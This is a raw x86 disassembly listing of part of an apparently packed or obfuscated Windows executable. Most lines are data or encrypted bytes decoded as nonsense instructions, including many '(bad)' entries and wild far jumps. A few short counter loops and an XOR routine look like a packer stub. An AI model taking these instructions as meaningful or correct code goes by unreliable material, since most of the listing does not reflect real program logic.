  4070b5:	adc    DWORD PTR [edi],edi
  4070b7:	dec    esp
  4070b8:	jge    0x407134
  4070ba:	mov    dh,0x65
  4070bc:	in     eax,0xf2
  4070be:	xchg   edx,eax
  4070bf:	sub    DWORD PTR [ebx+0x7e22808c],ebp
  4070c5:	es inc ecx
  4070c7:	cmp    esp,DWORD PTR [ecx]
  4070c9:	sahf   
  4070ca:	imul   ebp,DWORD PTR [edx-0x44],0x6bb13d25
  4070d1:	shr    BYTE PTR ds:0x51fea413,0x6
  4070d8:	popa   
  4070d9:	sub    edi,edi
  4070db:	cmp    ebp,DWORD PTR [ecx]
  4070dd:	push   ebx
  4070de:	inc    esi
  4070df:	jae    0x407127
  4070e1:	scas   al,BYTE PTR es:[edi]
  4070e2:	pop    ecx
  4070e3:	lea    edx,[eax]
  4070e5:	mov    al,BYTE PTR [edi+0x2c]
  4070e8:	push   cs
  4070e9:	sbb    esp,DWORD PTR [ecx-0x235426d1]
  4070ef:	sub    eax,0xbb76a237
  4070f4:	dec    edx
  4070f5:	sub    al,0xe9
  4070f7:	popf   
  4070f8:	adc    eax,0x810976d
  4070fd:	into   
  4070fe:	sbb    al,0x96
  407100:	call   0x30da:0x24e6d19f
  407107:	lea    ebx,[ebp+0x739fb129]
  40710d:	fwait
  40710e:	je     0x407181
  407110:	dec    edx
  407111:	int3   
  407112:	aaa    
  407113:	mov    dl,0xdb
  407115:	cwde   
  407116:	ror    DWORD PTR [ecx-0x7e5a8cb5],1
  40711c:	fnstsw WORD PTR [edx-0x7d]
  40711f:	adc    ebp,DWORD PTR [ecx-0x75efac8]
  407125:	fwait
  407126:	cld    
  407127:	clc    
  407128:	cwde   
  407129:	das    
  40712a:	xor    eax,0xa4ec5a4c
  40712f:	dec    edx
  407130:	jbe    0x4071a1
  407132:	push   ds
  407133:	xor    bl,BYTE PTR [esi-0x71]
  407136:	arpl   sp,cx
  407138:	push   eax
  407139:	jp     0x407194
  40713b:	nop
  40713c:	xor    al,0x59
  40713e:	loope  0x407164
  407140:	test   BYTE PTR [esi-0x7b99062a],ah
  407146:	or     ebx,DWORD PTR [ebp-0xc]
  407149:	mov    ch,0x88
  40714b:	dec    ebp
  40714c:	pop    ebx
  40714d:	mov    esp,0xcd00b349
  407152:	popa   
  407153:	sbb    BYTE PTR [edi+ebx*8+0x42],dl
  407157:	popf   
  407158:	icebp  
  407159:	xchg   ecx,edx
  40715b:	jmp    0x59db4aee
  407160:	les    eax,FWORD PTR [edx]
  407162:	pushf  
  407163:	xchg   ebp,eax
  407164:	jno    0x40716b
  407166:	xlat   BYTE PTR ds:[ebx]
  407167:	mov    bl,0x81
  407169:	es stos BYTE PTR es:[edi],al
  40716b:	and    edi,DWORD PTR [ecx]
  40716d:	dec    edi
  40716e:	js     0x407151
  407170:	(bad)  
  407171:	cwde   
  407172:	push   ss
  407173:	ss inc ebx
  407175:	cmp    cl,dl
  407177:	dec    ebp
  407178:	mov    ds:0xabbbdf3a,al
  40717d:	add    dl,BYTE PTR [edx]
  40717f:	cmp    al,0xd
  407181:	mov    ebp,0x357ace08
  407186:	dec    edi
  407187:	cld    
  407188:	push   es
  407189:	mov    esi,ebx
  40718b:	xchg   ecx,eax
  40718c:	mov    WORD PTR [eax+0x45],?
  40718f:	xor    al,BYTE PTR [esi+0x12eb2591]
  407195:	sub    ah,BYTE PTR [edi+0x2defde2c]
  40719b:	pop    ebx
  40719c:	xchg   DWORD PTR [eax-0x7026ee56],esi
  4071a2:	mov    dl,0xb6
  4071a4:	push   ds
  4071a5:	xchg   ebx,eax
  4071a6:	xchg   ebx,eax
  4071a7:	sub    eax,0x80ce0fec
  4071ac:	xchg   esi,eax
  4071ad:	ja     0x4071bf
  4071af:	test   BYTE PTR [esi-0x49],dh
  4071b2:	sar    DWORD PTR [ebx-0x59],1
  4071b5:	jmp    0x4071a0
  4071b7:	jp     0x4071d0
  4071b9:	adc    ebp,DWORD PTR [ecx]
  4071bb:	and    DWORD PTR [ecx],0xffffffeb
  4071be:	ret    
  4071bf:	push   eax
  4071c0:	jne    0x40715e
  4071c2:	jmp    0xe0c3:0x40cb6dc0
  4071c9:	es std 
  4071cb:	mov    fs,edi
  4071cd:	mov    ch,0x9a
  4071cf:	adc    al,0xfb
  4071d1:	test   BYTE PTR [edx+0x30],al
  4071d4:	aam    0xdc
  4071d6:	test   al,0x61
  4071d8:	dec    ebx
  4071d9:	xor    BYTE PTR [ebx-0x2c],cl
  4071dc:	leave  
  4071dd:	stc    
  4071de:	inc    eax
  4071df:	add    cl,BYTE PTR [edx-0x331d9d87]
  4071e5:	icebp  
  4071e6:	jl     0x40723e
  4071e8:	adc    eax,0xe62ee130
  4071ed:	ret    0x7efc
  4071f0:	imul   ebp,DWORD PTR ds:0xbf79a517,0x643e55ea
  4071fa:	(bad)  
  4071fb:	pop    ebx
  4071fc:	push   ds
  4071fd:	ficom  WORD PTR [ebp+0x6c0ad591]
  407203:	lods   eax,DWORD PTR ds:[esi]
  407204:	lods   al,BYTE PTR ds:[esi]
  407205:	mov    al,0x18
  407207:	xchg   ebx,eax
  407208:	mov    ebx,0xfb92d741
  40720d:	add    al,0x6c
  40720f:	adc    ebx,esi
  407211:	(bad)  
  407212:	xor    esp,DWORD PTR [edi-0xd8a432d]
  407218:	dec    edx
  407219:	mov    ds:0x8a2cda38,eax
  40721e:	leave  
  40721f:	mov    esi,0x21440236
  407224:	jle    0x407281
  407226:	inc    esi
  407227:	sahf   
  407228:	sbb    ah,bh
  40722a:	aad    0xa3
  40722c:	sub    dh,dl
  40722e:	(bad)  
  40722f:	dec    ebx
  407230:	mov    edi,0xc19ebf0f
  407235:	mov    ss,WORD PTR [edi-0x5cb030b2]
  40723b:	jl     0x4071db
  40723d:	xor    ecx,eax
  40723f:	jmp    0xe069:0xa7a463fc
  407246:	ficom  DWORD PTR [ecx-0x41]
  407249:	bound  ebx,QWORD PTR [ebx+0x15]
  40724c:	adc    al,0x1f
  40724e:	repnz sbb al,0xb6
  407251:	add    eax,0xf59f99d4
  407256:	addr16 dec eax
  407258:	push   ecx
  407259:	xchg   edi,eax
  40725a:	nop
  40725b:	repz adc BYTE PTR [edx+0x1e29f182],0x88
  407263:	or     ebx,DWORD PTR cs:[ecx-0x45]
  407267:	(bad)  
  407268:	mov    dl,0x39
  40726a:	(bad)  
  40726b:	jp     0x40725e
  40726d:	mov    ebp,DWORD PTR [edx+0x6b1f4102]
  407273:	mov    al,0xba
  407275:	push   es
  407276:	inc    ecx
  407277:	cmp    DWORD PTR [esi],edi
  407279:	(bad)  
  40727b:	inc    edx
  40727c:	mov    ch,0x2b
  40727e:	cmp    ebp,esp
  407280:	es jnp 0x4072a9
  407283:	xor    ebx,DWORD PTR [esi-0x2d0a13a]
  407289:	push   edi
  40728a:	pop    eax
  40728b:	or     eax,0x9e845a05
  407290:	push   ebx
  407291:	mov    eax,0x98ba4d66
  407296:	out    dx,al
  407297:	pop    ds
  407298:	cmp    eax,0x2c72c070
  40729d:	mov    ds:0xc3011686,al
  4072a2:	jp     0x40724d
  4072a4:	hlt    
  4072a5:	or     BYTE PTR [ebx],bl
  4072a7:	adc    BYTE PTR [ebx-0x6f094d9d],ah
  4072ad:	pop    edx
  4072ae:	aam    0x8b
  4072b0:	xchg   ecx,eax
  4072b1:	lds    ecx,FWORD PTR [edx+eax*1]
  4072b4:	sahf   
  4072b5:	retf   0x9ff8
  4072b8:	push   ebx
  4072b9:	add    eax,0xb7509239
  4072be:	lock jbe 0x407310
  4072c1:	hlt    
  4072c2:	repnz test eax,0xe84e3280
  4072c8:	test   DWORD PTR [esp+edx*1+0x77],esp
  4072cc:	jge    0x407282
  4072ce:	add    BYTE PTR [edi+0x637cb8c],cl
  4072d4:	xor    ebx,0x68708798
  4072da:	dec    esi
  4072db:	pop    DWORD PTR [esi+0x22]
  4072de:	mov    BYTE PTR [edi],cl
  4072e0:	inc    edi
  4072e1:	aam    0x87
  4072e3:	and    al,0x8b
  4072e5:	inc    edi
  4072e6:	or     al,0x69
  4072e8:	(bad)
  4072eb:	add    al,0xe4
  4072ed:	jmp    FWORD PTR [esi+0x44]
  4072f0:	ins    DWORD PTR es:[edi],dx
  4072f1:	jne    0x407368
  4072f3:	fwait
  4072f4:	shr    ebp,0xaf
  4072f7:	add    al,0xb4
  4072f9:	jge    0x407375
  4072fb:	push   ecx
  4072fc:	setle  BYTE PTR [edx-0x14]
  407300:	cmp    BYTE PTR [ecx+0x60fd0421],ch
  407306:	xlat   BYTE PTR ds:[ebx]
  407307:	or     dh,BYTE PTR [esp+edi*1+0x6]
  40730b:	loopne 0x4072d0
  40730d:	(bad)
  407311:	nop
  407312:	push   esp
  407313:	or     ebp,DWORD PTR [edi]
  407315:	shr    cl,cl
  407317:	or     eax,0xa8a7e758
  40731c:	adc    DWORD PTR [ebx],eax
  40731e:	(bad)  
  40731f:	jmp    0x4072da
  407321:	pop    esi
  407322:	add    eax,esi
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a79925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a799
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a799,ecx
  407346:	cmp    DWORD PTR ds:0x42a799,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a799,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a8a9
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a799,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a799
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a799,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x3eb48434,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073d6
  4073b7:	in     eax,dx
  4073b8:	sbb    ebp,edi
  4073ba:	lea    edx,[ecx-0x3f]
  4073bd:	xchg   DWORD PTR [ecx],ebx
  4073bf:	fld    DWORD PTR ds:0x6635f7d3
  4073c5:	lds    ecx,FWORD PTR [ecx+0x2b25e38e]
  4073cb:	rcl    DWORD PTR [ecx+0x12],1
  4073ce:	mov    al,0xb9
  4073d0:	xchg   ecx,eax
  4073d1:	xlat   BYTE PTR ds:[ebx]
  4073d2:	push   ebx
  4073d3:	outs   dx,DWORD PTR ds:[esi]
  4073d4:	add    DWORD PTR [ecx+0x18],ebp
  4073d7:	mov    esi,DWORD PTR [ecx]
  4073d9:	dec    ebx
  4073da:	ret    0x6c5f
  4073dd:	push   ebx
  4073de:	dec    ebp
  4073df:	mov    edi,DWORD PTR [ebx+0x4e48fed3]
  4073e5:	xor    eax,0xa053bff7
  4073ea:	dec    edi
  4073eb:	(bad)  
  4073ec:	sbb    BYTE PTR [ecx],0x54
  4073ef:	adc    ah,BYTE PTR [edi]
  4073f1:	aaa    
  4073f2:	sbb    eax,0xf7eb80ae
  4073f7:	inc    esi
  4073f8:	or     DWORD PTR [eax-0x25422b94],ebp
  4073fe:	cmp    ebp,DWORD PTR [ebx]
  407400:	retf   0xe64b
  407403:	or     ah,ah
  407405:	hlt    
  407406:	pusha  
  407407:	mov    cl,0xb0
  407409:	add    BYTE PTR [edi-0xb],ah
  40740c:	jmp    0x4073b8
  40740e:	imul   edi,DWORD PTR [edx],0xffffff99
  407411:	mov    ds:0x6b29cff8,al
  407416:	inc    ebx
  407417:	sbb    esp,DWORD PTR [ebp+ebx*1-0x4cd31e84]
  40741e:	sub    BYTE PTR [edi-0x1e],dl
  407421:	inc    edi
  407422:	repz inc eax
  407424:	jmp    0x407485
  407426:	cld    
  407427:	outs   dx,BYTE PTR ds:[esi]
  407428:	lea    ecx,[eax-0x3f847e1]
  40742e:	mov    al,0xf6
  407430:	jae    0x407497
  407432:	repz push ebp
  407434:	sub    bh,BYTE PTR [edx-0x5aa43077]
  40743a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743b:	out    dx,al
  40743c:	and    BYTE PTR [edi-0x28f0be44],dh
  407442:	int    0x7c
  407444:	lock std 
  407446:	data16 jl 0x40742e
  407449:	es gs adc al,0x5b
  40744d:	mov    WORD PTR [esi],?
  40744f:	or     al,0x3
  407451:	icebp  
  407452:	or     BYTE PTR [ebp-0x638c8dde],0x96
  407459:	out    dx,eax
  40745a:	jb     0x4074a2
  40745c:	cwde   
  40745d:	ficom  DWORD PTR [ebx-0x50c36907]
  407463:	or     eax,0x341f5f20
  407468:	out    0x45,eax
  40746a:	mov    esi,eax
  40746c:	sub    al,0x2f
  40746e:	push   ds
  40746f:	mov    ch,0x9b
  407471:	ins    DWORD PTR es:[edi],dx
  407472:	pop    ecx
  407473:	xor    eax,0x3a86e319
  407478:	sub    al,0xe2
  40747a:	pop    es
  40747b:	call   0xe2b3:0xccb63c39
  407482:	sti    
  407483:	out    0x97,eax
  407485:	mov    esi,0x5693e3fa
  40748a:	push   edx
  40748b:	mov    esp,0x8d89aa0e
  407490:	cmp    DWORD PTR [edx-0x2c39ac3d],edx
  407496:	jecxz  0x4074eb
  407498:	or     al,dl
  40749a:	mov    ch,bl
  40749c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40749e:	jns    0x4074a5
  4074a0:	imul   edx,esi,0xd49ab450
  4074a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a7:	jmp    0xe45c6e5a
  4074ac:	adc    DWORD PTR [ebx],edi
  4074ae:	jmp    FWORD PTR [eax-0x2f3cd9b9]
  4074b4:	ds dec edx
  4074b6:	pushf  
  4074b7:	enter  0xfc88,0x3b
  4074bb:	xor    ch,BYTE PTR [ebp-0x2daded5f]
  4074c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c2:	or     ebx,DWORD PTR [ebp+0x48]
  4074c5:	pop    ebx
  4074c6:	xor    eax,0xcd8ac21a
  4074cb:	outs   dx,BYTE PTR ds:[esi]
  4074cc:	push   edx
  4074cd:	or     BYTE PTR [esi],dl
  4074cf:	cwde   
  4074d0:	call   0x99db:0xc327e11a
  4074d7:	and    BYTE PTR [edx],0x8e
  4074da:	mov    ah,0xd7
  4074dc:	push   ebx
  4074dd:	nop
  4074de:	push   0xb47601e0
  4074e3:	popa   
  4074e4:	jno    0x4074e8
  4074e6:	cmp    eax,esp
  4074e8:	(bad)  
  4074e9:	retf   0x2535
  4074ec:	dec    eax
  4074ed:	mov    ds,WORD PTR [esi+0x3a629bc8]
  4074f3:	add    BYTE PTR [edi-0x4965c5cd],0x57
  4074fa:	xor    al,0x22
  4074fc:	pop    ecx
  4074fd:	and    edx,edi
  4074ff:	adc    DWORD PTR [ebx-0x1a],0xffffffde
  407503:	adc    al,BYTE PTR [edi-0x30b5bfdc]
  407509:	mov    cl,0xea
  40750b:	jecxz  0x407505
  40750d:	sbb    BYTE PTR [ebx+0x31d403c6],cl
  407513:	call   0x18c7af07
  407518:	je     0x4074b9
  40751a:	mov    ecx,0x9d2a9a9a
  40751f:	cmp    al,0x6a
  407521:	gs into 
  407523:	cwde   
  407524:	jecxz  0x40757d
  407526:	(bad)  
  407527:	fcmovu st,st(1)
  407529:	dec    esp
  40752a:	push   cs
  40752b:	and    al,0x66
  40752d:	das    
  40752e:	pop    esi
  40752f:	mov    fs,WORD PTR [eax+0x50]
  407532:	stos   DWORD PTR es:[edi],eax
  407533:	popf   
  407534:	stc    
  407535:	pop    ds
  407536:	inc    ebx
  407537:	mov    eax,0xa2d2cdff
  40753c:	dec    ecx
  40753d:	iret   
  40753e:	aad    0xed
  407540:	adc    BYTE PTR [edx+eiz*1-0x13],al
  407544:	add    eax,0xdf2d67fb
  407549:	or     eax,0xaf40fd8
  40754e:	inc    esi
  40754f:	test   al,cl
  407551:	sub    al,0x95
  407553:	call   0xb2b88ccf
  407558:	add    edx,DWORD PTR [esi-0x1e]
  40755b:	sbb    esp,0x5eedf089
  407561:	ret    0xd302
  407564:	cwde   
  407565:	xor    DWORD PTR [ecx],0xffffff9c
  407568:	fsubr  QWORD PTR [ebp+0x69d51af]
  40756e:	mov    ds:0x10d7cf0,eax
  407573:	adc    edx,DWORD PTR [esi+0x5aae1e00]
  407579:	add    BYTE PTR [ebp-0x2f],dh
  40757c:	mov    edi,DWORD PTR [edi-0x6b]
  40757f:	jmp    0xad0a6b0d
  407584:	mov    edi,ebx
  407586:	frstor [ebx-0x1b4bc0c2]
  40758c:	xchg   DWORD PTR [ebp+esi*1-0x7bc1e926],edi
  407593:	sub    eax,0x329abefb
  407598:	popf   
  407599:	push   DWORD PTR [ecx]
  40759b:	mov    ch,0xb3
  40759d:	dec    edx
  40759e:	jnp    0x4075b3
  4075a0:	push   ebp
  4075a1:	je     0x40752a
  4075a3:	sub    cl,BYTE PTR [ebp-0xa]
  4075a6:	jbe    0x407617
  4075a8:	jmp    0xe29a:0x8e546d2a
  4075af:	xchg   edi,eax
  4075b0:	pop    eax
  4075b1:	fs xchg ebx,eax
  4075b3:	ret    0xf387
  4075b6:	ins    DWORD PTR es:[edi],dx
  4075b7:	xor    eax,0x2285c196
  4075bc:	idiv   DWORD PTR [ebx-0x3796820d]
  4075c2:	loopne 0x407639
  4075c4:	and    DWORD PTR [eax-0x4930619f],esi
  4075ca:	jno    0x4075d9
  4075cc:	and    eax,0x51d4bd7a
  4075d1:	xlat   BYTE PTR ds:[ebx]
  4075d2:	mov    esi,0xeab26b39
  4075d7:	mov    BYTE PTR [edx-0x1f],bh
  4075da:	aad    0xcb
  4075dc:	xchg   esi,eax
  4075dd:	add    BYTE PTR [ebx+0x29760fe8],dh
  4075e3:	jge    0x4075af
  4075e5:	mov    eax,ds:0x418c8750
  4075ea:	mov    al,ds:0x1ebcebf6
  4075ef:	fidiv  DWORD PTR [eax-0x5a9b418f]
  4075f5:	in     eax,0x8e
  4075f7:	outs   dx,DWORD PTR ds:[esi]
  4075f8:	sub    al,0xbd
  4075fa:	inc    eax
  4075fb:	mov    DWORD PTR [edx+0x3],ebp
  4075fe:	inc    ecx
  4075ff:	push   eax
  407600:	wbinvd 
  407602:	sbb    esi,ebx
  407604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407606:	cmp    al,0x2c
  407608:	call   0xaec3:0xeedf183c
  40760f:	push   ss
  407610:	pushf  
  407611:	dec    esi
  407612:	(bad)  
  407613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407614:	xchg   ecx,eax
  407615:	clc    
  407616:	jb     0x407601
  407618:	imul   esp,DWORD PTR [ebp+0x5b4ec15e],0x4a
  40761f:	jo     0x40768d
  407621:	(bad)  
  407622:	xchg   ecx,eax
  407623:	jl     0x40766a
  407625:	scas   eax,DWORD PTR es:[edi]
  407626:	mov    cl,0x22
  407628:	fidivr WORD PTR [esi+ebp*1]
  40762b:	and    ebx,DWORD PTR ds:0xca2c4874
  407631:	inc    ebp
  407632:	(bad)  
  407633:	mov    ds:0x2c36322a,al
  407638:	dec    edx
  407639:	dec    ecx
  40763a:	xchg   edx,eax
  40763b:	fwait
  40763c:	js     0x4075e4
  40763e:	stos   DWORD PTR es:[edi],eax
  40763f:	push   0x7e48e28e
  407644:	pop    ds
  407645:	inc    ebx
  407646:	sub    DWORD PTR [esp+esi*8],0xce48bc84
  40764d:	in     eax,dx
  40764e:	retf   0xc7c1
  407651:	in     al,0xc0
  407653:	pop    ds
  407654:	jp     0x407608
  407656:	push   ebp
  407657:	mov    al,0xc3
  407659:	adc    DWORD PTR [ecx-0xe],ebp
  40765c:	push   esi
  40765d:	fcmovu st,st(0)
  40765f:	dec    esi
  407660:	mov    cl,0x76
  407662:	jno    0x407631
  407664:	scas   al,BYTE PTR es:[edi]
  407665:	fimul  DWORD PTR [eax]
  407667:	pop    ebp
  407668:	push   edi
  407669:	sti    
  40766a:	retfw  0xb144
  40766e:	push   0x16
  407670:	in     eax,dx
  407671:	addr16 pop ebp
  407673:	call   0x92426755
  407678:	or     ebx,DWORD PTR [esi+0x47a49c38]
  40767e:	and    BYTE PTR ds:0xdba1f322,bl
  407684:	pop    eax
  407685:	(bad)  
  407686:	loopne 0x407649
  407688:	add    bl,ah
  40768a:	jmp    0xf04463dd
  40768f:	inc    esi
  407690:	xchg   ebx,eax
  407691:	push   esp
  407692:	sti    
  407693:	jo     0x407705
  407695:	pop    es
  407696:	jmp    0x5570:0xdf6f9200
  40769d:	push   cs
  40769e:	sahf   
  40769f:	addr16 int 0x82
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a781,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a85d,0x42a79d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7d9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7d9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7d9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7d9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7d9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7d9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7d9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7d9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x38518918],1
  407796:	adc    BYTE PTR [edx+ebp*2-0x50],bh
  40779a:	(bad)  
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077ed
  4077a2:	ss dec esp
  4077a4:	iret   
  4077a5:	mov    al,0xc9
  4077a7:	scas   al,BYTE PTR es:[edi]
  4077a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077a9:	sbb    al,0x23
  4077ab:	sar    DWORD PTR [ecx-0x1a51dcf3],1
  4077b1:	and    BYTE PTR [edi+esi*2+0x3],bl
  4077b5:	ror    BYTE PTR [edi],1
  4077b7:	mov    eax,ds:0x5a8f9cc9
  4077bc:	mov    edi,0x9787df73
  4077c1:	adc    DWORD PTR [ebp+0x3e],esi
  4077c4:	and    al,0xdd
  4077c6:	cmc    
  4077c7:	push   0xfffffff4
  4077c9:	mov    esi,0xfabc347f
  4077ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077cf:	push   edi
  4077d0:	icebp  
  4077d1:	jns    0x40780e
  4077d3:	add    eax,0x4f250db9
  4077d8:	mov    eax,DWORD PTR [eax-0x1d44f1b1]
  4077de:	int3   
  4077df:	jnp    0x407848
  4077e1:	ret    0x6659
  4077e4:	stos   DWORD PTR es:[edi],eax
  4077e5:	ror    DWORD PTR [eax+0x2e844ce1],1
  4077eb:	push   0x36e4706e
  4077f0:	push   esp
  4077f1:	in     al,0x63
  4077f3:	lods   al,BYTE PTR ds:[esi]
  4077f4:	sbb    ch,cl
  4077f6:	or     ebx,DWORD PTR [eax]
  4077f8:	(bad)  
  4077f9:	fdivr  st(0),st
  4077fb:	fcomip st,st(4)
  4077fd:	cmp    ebx,DWORD PTR [ebp+0x522dc385]
  407803:	xchg   ebx,eax
  407804:	or     ebp,ebp
  407806:	sar    BYTE PTR [ebx-0x7a],cl
  407809:	and    ch,dl
  40780b:	iret   
  40780c:	fwait
  40780d:	or     eax,0x57361f75
  407812:	es push ebx
  407814:	xchg   DWORD PTR [edi],ebx
  407816:	xchg   DWORD PTR [eax+0x3e],ebp
  407819:	aas    
  40781a:	push   ebx
  40781b:	repz xchg edx,eax
  40781d:	inc    edi
  40781e:	push   ecx
  40781f:	xor    al,0x25
  407821:	cs jno 0x40783c
  407824:	xlat   BYTE PTR ds:[ebx]
  407825:	sbb    ebp,ecx
  407827:	inc    esp
  407828:	fwait
  407829:	inc    eax
  40782a:	cs fs mov cl,0x34
  40782e:	mov    eax,ds:0x30c79531
  407833:	pusha  
  407834:	mov    ds:0x489eab6f,al
  407839:	cmp    eax,0x43ea1a7a
  40783e:	cmc    
  40783f:	test   BYTE PTR [eax],0x46
  407842:	xchg   esp,eax
  407843:	sbb    al,0x9a
  407845:	mov    BYTE PTR [esi-0x14],0xf9
  407849:	push   ss
  40784a:	inc    edx
  40784b:	dec    eax
  40784c:	or     bl,dh
  40784e:	xor    esi,DWORD PTR [esi-0xe]
  407851:	cwde   
  407852:	jmp    0x9617:0x130c3d21
  407859:	lock mov edi,0x1fec6ce1
  40785f:	gs jecxz 0x407835
  407862:	ja     0x4078be
  407864:	addr16 xchg ecx,eax
  407866:	dec    esi
  407867:	xchg   edx,eax
  407868:	ds push ecx
  40786a:	sbb    eax,0xb7af5ae7
  40786f:	hlt    
  407870:	or     BYTE PTR [eax],ch
  407872:	clc    
  407873:	mov    edx,0x210739d3
  407878:	retf   
  407879:	cwde   
  40787a:	push   0xffffffe2
  40787c:	retf   0x9334
  40787f:	inc    eax
  407880:	ins    BYTE PTR es:[edi],dx
  407881:	cmp    ebp,DWORD PTR [ebp+0x46]
  407884:	ins    BYTE PTR es:[edi],dx
  407885:	xlat   BYTE PTR ds:[ebx]
  407886:	(bad)  
  407887:	push   eax
  407888:	jg     0x4078f7
  40788a:	mov    ds:0x826bbede,al
  40788f:	pop    esi
  407890:	push   ds
  407891:	and    eax,0x296334bb
  407896:	push   es
  407897:	(bad)  
  407899:	lahf   
  40789a:	data16 in al,0x36
  40789d:	daa    
  40789e:	xor    BYTE PTR [ecx+0x1577a89d],cl
  4078a4:	ins    BYTE PTR es:[edi],dx
  4078a5:	cdq    
  4078a6:	pop    ecx
  4078a7:	push   esp
  4078a8:	cli    
  4078a9:	push   esi
  4078aa:	mov    ecx,0x96e7fff8
  4078af:	sub    ch,BYTE PTR [ebx+0x5e1609a7]
  4078b5:	inc    edi
  4078b6:	into   
  4078b7:	repnz inc ebp
  4078b9:	mov    eax,ds:0xe09b03c0
  4078be:	cdq    
  4078bf:	repnz retf 0x943e
  4078c3:	daa    
  4078c4:	mov    esp,0x15640956
  4078c9:	(bad)  
  4078cb:	or     DWORD PTR [edx-0x5ff8016e],ebx
  4078d1:	mov    dl,0x7f
  4078d3:	icebp  
  4078d4:	dec    edi
  4078d5:	(bad)  
  4078d6:	popa   
  4078d7:	xchg   ebp,eax
  4078d8:	inc    esp
  4078d9:	add    al,0xae
  4078db:	dec    eax
  4078dc:	js     0x4078e0
  4078de:	push   es
  4078df:	stos   DWORD PTR es:[edi],eax
  4078e0:	xor    al,0xa9
  4078e2:	loopne 0x407933
  4078e4:	pop    ebx
  4078e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078e6:	adc    BYTE PTR [ebx],bh
  4078e8:	fs aas 
  4078ea:	jb     0x4078b1
  4078ec:	stc    
  4078ed:	sub    al,0xa6
  4078ef:	or     DWORD PTR [ecx],eax
  4078f1:	push   0xffffff8a
  4078f3:	push   ss
  4078f4:	pop    ebp
  4078f5:	ret    0xb30b
  4078f8:	adc    al,0xbc
  4078fa:	call   0x1cdc63fe
  4078ff:	adc    DWORD PTR [esi-0x77985820],edx
  407905:	mov    eax,ds:0xcc72ba93
  40790a:	adc    al,0x35
  40790c:	or     ebx,DWORD PTR [eax+eiz*8-0x65]
  407910:	inc    DWORD PTR [edi]
  407912:	loope  0x4078e9
  407914:	ins    BYTE PTR es:[edi],dx
  407915:	and    esi,DWORD PTR [ebx-0x2b]
  407918:	mov    dl,0x5
  40791a:	xchg   ebx,eax
  40791b:	neg    esp
  40791d:	inc    esi
  40791e:	rcr    DWORD PTR [ecx-0x2],cl
  407921:	stos   DWORD PTR es:[edi],eax
  407922:	push   ebx
  407923:	sbb    al,0x6
  407925:	cwde   
  407926:	(bad)  
